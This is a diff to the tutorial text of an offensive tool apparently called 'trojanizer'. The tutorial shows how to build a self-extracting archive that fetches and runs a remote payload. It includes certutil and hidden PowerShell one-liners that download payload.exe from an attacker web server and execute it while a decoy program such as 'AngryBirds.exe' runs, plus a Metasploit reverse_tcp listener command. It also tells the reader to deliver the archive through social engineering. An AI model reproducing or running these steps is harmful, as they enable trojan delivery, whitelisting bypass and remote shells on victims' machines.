@@ -94,7 +94,6 @@
     | https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/ |
     ╚────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝
 
-
     The follow exercise describes how to use trojanizer single_file_execution and Presetup sfx built-in
     switchs to drop and execute any payload using 'certutil' or 'powershell' appl whitelisting bypass oneliners ..
 
@@ -111,17 +110,19 @@
          SINGLE_EXEC=ON
 
     4º - running trojanizer tool
-         PAYLOAD TO BE COMPRESSED => any_file (it will not matter what you compress)
-         EXECUTE THIS FILE UPON EXTRACTION => any_legit_appl.exe (to be executed as decoy appl)
+         PAYLOAD TO BE COMPRESSED => screenshot.png (it will not matter what you compress)
+         EXECUTE THIS FILE UPON EXTRACTION => AngryBirds.exe (to be executed as the decoy application)
          PRESETUP SANDBOX => cmd.exe /c certutil -urlcache -split -f 'http://webserver/payload.exe', '%TEMP%\\payload.exe'; Start-Process '%TEMP%\\payload.exe'
 
     5º - start a listenner, and send the sfx archive to target using social enginnering
          msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.69; set lport 666; exploit'
 
+
     ╔────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
     |      When the sfx archive its executed, it will download payload.exe from our apache2 webserver to target and      |
-    |  execute it before extract 'any_file' and 'any_legit_appl.exe' (this last one will be executed to serve as decoy)  |
+    |    execute it before extract 'screenshot.png' and 'AngryBirds.exe' (last one will be executed to serve as decoy)   |
     ╚────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝
+
 
     The follow oneliner uses 'powershell(Downloadfile+start)' method to achieve the same as previous 'certutil' exercise ..
     cmd.exe /c powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://webserver/payload.exe', '%TEMP%\\payload.exe') & start '%TEMP%\\payload.exe'
